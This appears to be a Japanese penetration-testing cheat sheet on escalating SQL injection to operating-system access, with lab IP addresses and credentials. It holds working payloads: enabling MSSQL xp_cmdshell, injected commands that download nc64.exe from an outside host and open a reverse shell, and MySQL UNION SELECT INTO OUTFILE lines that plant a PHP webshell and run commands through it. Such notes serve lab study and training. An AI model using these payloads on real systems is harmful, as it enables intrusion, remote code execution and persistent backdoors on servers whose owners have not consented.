オペレーティング システム、サービス権限、およびファイル システムのアクセス許可によっては、SQL インジェクションの脆弱性を利用して、基盤となるオペレーティング システム上のファイルの読み取りと書き込みが行われる可能性がある

## MSSQL
ログイン
```bash
impacket-mssqlclient Administrator:Lab123@192.168.121.18 -windows-auth
```

xp_cmdshellの有効化
```bash
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

コマンド実行
```bash
EXECUTE xp_cmdshell 'whoami';
```

 ### BurpSuiteのRepeaterで行う
 1. nc64.exeをDLさせる
```bash
';EXEC+master.dbo.xp_cmdshell+'curl+http://192.168.45.204:80/nc64.exe+-o+c:\windows\temp\nc64.exe+';--+-
```
2. Reverseshell
```bash
';EXEC+master.dbo.xp_cmdshell+'c:\windows\temp\nc64.exe+192.168.45.204+4444+-e+cmd.exe';--+-
```
---

# MySQL
## 例1
1. **UNION SELECT** SQL キーワードを発行して、最初の列に 1 行の PHP 行を含め、書き込み可能な Web フォルダーに**webshel​​l.phpとして保存**
```bash
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
実行後エラーを出力することもあるが、書き込みには影響していない

2. 書き込まれたwebshell.phpを介してOSにアクセス
```bash
# ブラウザからhttp://192.168.121.19/tmp/webshell.php?cmd=idにアクセス
http://192.168.121.19/tmp/webshell.php?cmd=id
```

## 例2
1. **UNION SELECT** SQL キーワードを発行して、最初の列に 1 行の PHP 行を含め、書き込み可能な Web フォルダーに**webshel​​l.phpとして保存**
```bash
mail-list=test@example.com' UNION SELECT NULL, NULL, NULL, NULL, NULL, "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/webshell.php' -- 
```

2. 書き込まれたwebshell.phpを介してOSにアクセス
```bash
# ブラウザからhttp://192.168.121.19/tmp/webshell.php?cmd=idにアクセス
http://forestsave.lab/webshell.php?cmd=id
```

※書き込む列をずらしながら試していくことが重要
